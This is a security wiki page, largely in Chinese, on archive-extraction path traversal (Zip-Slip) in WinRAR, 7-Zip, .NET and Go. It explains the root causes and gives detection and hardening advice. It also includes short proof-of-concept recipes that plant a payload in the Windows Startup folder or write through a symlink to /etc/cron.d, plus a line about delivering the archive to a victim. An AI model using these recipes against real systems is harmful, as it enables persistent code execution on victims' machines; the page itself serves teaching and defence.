# Archive Extraction Path Traversal ("Zip-Slip" / WinRAR CVE-2025-8088)

{{#include ../banners/hacktricks-training.md}}

## 概述

许多存档格式（ZIP, RAR, TAR, 7-ZIP 等）允许每个条目携带其自身的 **internal path**。当解压工具盲目遵从该路径时，包含 `..` 的特制文件名或一个 **absolute path**（例如 `C:\Windows\System32\`）可能会写入用户选择目录之外。
此类漏洞广泛称为 *Zip-Slip* 或 **archive extraction path traversal**。

后果可能从覆盖任意文件到通过将 payload 放入如 Windows *Startup* 文件夹等 **auto-run** 位置，直接实现 **remote code execution (RCE)**。

## 根本原因

1. 攻击者创建一个归档，其中一个或多个文件头包含：
* 相对遍历序列 (`..\..\..\Users\\victim\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\payload.exe`)
* 绝对路径 (`C:\\ProgramData\\Microsoft\\Windows\\Start Menu\\Programs\\StartUp\\payload.exe`)
* 或特制的 **symlinks**，解析后位于目标目录之外（在 *nix* 上的 ZIP/TAR 中常见）。
2. 受害者使用有漏洞的工具解压该归档，该工具信任嵌入的路径（或跟随 symlinks），而没有对其进行清理或强制将解压写入所选目录之下。
3. 文件被写入攻击者控制的位置，并在系统或用户下次触发该路径时被执行或加载。

### .NET `Path.Combine` + `ZipArchive` traversal

一个常见的 .NET 反模式是将目标路径与 **user-controlled** `ZipArchiveEntry.FullName` 结合，并在没有进行路径规范化的情况下进行解压：
```csharp
using (var zip = ZipFile.OpenRead(zipPath))
{
foreach (var entry in zip.Entries)
{
var dest = Path.Combine(@"C:\samples\queue\", entry.FullName); // drops base if FullName is absolute
entry.ExtractToFile(dest);
}
}
```
- 如果 `entry.FullName` 以 `..\\` 开头，则会进行遍历；如果它是一个 **absolute path**，左侧组件会被完全丢弃，从而作为提取身份导致 **arbitrary file write**。
- 用于写入被计划扫描器监视的同级 `app` 目录的概念验证归档：
```python
import zipfile
with zipfile.ZipFile("slip.zip", "w") as z:
z.writestr("../app/0xdf.txt", "ABCD")
```
将该 ZIP 投递到受监视的收件箱会导致 `C:\samples\app\0xdf.txt` 的生成，证明可以从 `C:\samples\queue\` 向外进行遍历并启用后续原语（例如 DLL hijacks）。

## 真实案例 – WinRAR ≤ 7.12 (CVE-2025-8088)

适用于 Windows 的 WinRAR（包括 `rar` / `unrar` CLI、DLL 和可移植源码）在解压时未能验证文件名。
恶意 RAR 归档包含如下条目：
```text
..\..\..\Users\victim\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\payload.exe
```
将会落在所选输出目录的**外部**，并位于用户的*Startup* 文件夹中。登录后 Windows 会自动执行那里的所有内容，从而提供*持久* RCE。

### 制作 PoC 归档 (Linux/Mac)
```bash
# Requires rar >= 6.x
mkdir -p "evil/../../../Users/Public/AppData/Roaming/Microsoft/Windows/Start Menu/Programs/Startup"
cp payload.exe "evil/../../../Users/Public/AppData/Roaming/Microsoft/Windows/Start Menu/Programs/Startup/"
rar a -ep evil.rar evil/*
```
Options used:
* `-ep`  – 将文件路径按原样存储（不要修剪开头的 `./`）。

将 `evil.rar` 交付给受害者，并指示他们使用存在漏洞的 WinRAR 构建进行解压。

### Observed Exploitation in the Wild

ESET 报告称 RomCom (Storm-0978/UNC2596) 的 spear-phishing 活动附带利用 CVE-2025-8088 的 RAR 存档，以部署定制的 backdoors 并促进 ransomware 操作。

## Newer Cases (2024–2025)

### 7-Zip ZIP symlink traversal → RCE (CVE-2025-11001 / ZDI-25-949)
* **漏洞**：ZIP 条目为 **symbolic links**，在解压时会被解引用，使攻击者能够逃出目标目录并覆盖任意路径。用户交互仅需 *打开/解压* 存档。
* **受影响**：7-Zip 21.02–24.09（Windows & Linux 构建）。在 **25.00**（2025 年 7 月）及之后修复。
* **影响路径**：覆盖 `Start Menu/Programs/Startup` 或服务运行位置 → 代码将在下次登录或服务重启时运行。
* **Quick PoC (Linux)**：
```bash
mkdir -p out
ln -s /etc/cron.d evil
zip -y exploit.zip evil   # -y preserves symlinks
7z x exploit.zip -o/tmp/target   # vulnerable 7-Zip writes to /etc/cron.d
```
On a patched build `/etc/cron.d` won’t be touched; the symlink is extracted as a link inside /tmp/target.

### Go mholt/archiver Unarchive() Zip-Slip (CVE-2025-3445)
* **漏洞**：`archiver.Unarchive()` 会跟随 `../` 和符号链接的 ZIP 条目，写入到 `outputDir` 之外。
* **受影响**：`github.com/mholt/archiver` ≤ 3.5.1（该项目现已弃用）。
* **修复**：切换到 `mholt/archives` ≥ 0.1.0 或在写入前实现规范路径检查。
* **最小复现示例**：
```go
// go test . with archiver<=3.5.1
archiver.Unarchive("exploit.zip", "/tmp/safe")
// exploit.zip holds ../../../../home/user/.ssh/authorized_keys
```

## Detection Tips

* **静态检查** – 列出存档条目并标记任何名称包含 `../`、`..\\`、*绝对路径*（`/`、`C:`）或类型为 *symlink* 且其目标位于解压目录之外的条目。
* **规范化** – 确保 `realpath(join(dest, name))` 仍以 `dest` 开头。否则拒绝。
* **沙箱解压** – 使用 *安全* 解压器（例如 `bsdtar --safe --xattrs --no-same-owner`、7-Zip ≥ 25.00）将内容解压到一次性目录，并验证结果路径仍在该目录内。
* **端点监控** – 在 WinRAR/7-Zip 等打开存档后不久，对于写入到 `Startup`/`Run`/`cron` 位置的新可执行文件发出告警。

## Mitigation & Hardening

1. **更新解压工具** – WinRAR 7.13+ 和 7-Zip 25.00+ 实现了路径/符号链接清理。两款工具仍然缺乏自动更新功能。
2. 在可能的情况下使用“**Do not extract paths**” / “**Ignore paths**”选项解压存档。
3. 在 Unix 上，在解压前降低权限并挂载 **chroot/namespace**；在 Windows 上，使用 **AppContainer** 或沙箱。
4. 如果编写自定义代码，请在创建/写入前使用 `realpath()`/`PathCanonicalize()` 进行规范化，并拒绝任何逃出目标目录的条目。

## Additional Affected / Historical Cases

* 2018 – Snyk 发布的大规模 *Zip-Slip* 通告，影响许多 Java/Go/JS 库。
* 2023 – 7-Zip CVE-2023-4011 在 `-ao` 合并期间发生类似遍历。
* 2025 – HashiCorp `go-slug` (CVE-2025-0377) 在 slugs 中的 TAR 解压遍历（在 v1.2 修复）。
* 任何在写入前未调用 `PathCanonicalize` / `realpath` 的自定义解压逻辑。

## References

- [Trend Micro ZDI-25-949 – 7-Zip symlink ZIP traversal (CVE-2025-11001)](https://www.zerodayinitiative.com/advisories/ZDI-25-949/)
- [JFrog Research – mholt/archiver Zip-Slip (CVE-2025-3445)](https://research.jfrog.com/vulnerabilities/archiver-zip-slip/)
- [Meziantou – Prevent Zip Slip in .NET](https://www.meziantou.net/prevent-zip-slip-in-dotnet.htm)
- [0xdf – HTB Bruno ZipSlip → DLL hijack chain](https://0xdf.gitlab.io/2026/02/24/htb-bruno.html)

{{#include ../banners/hacktricks-training.md}}
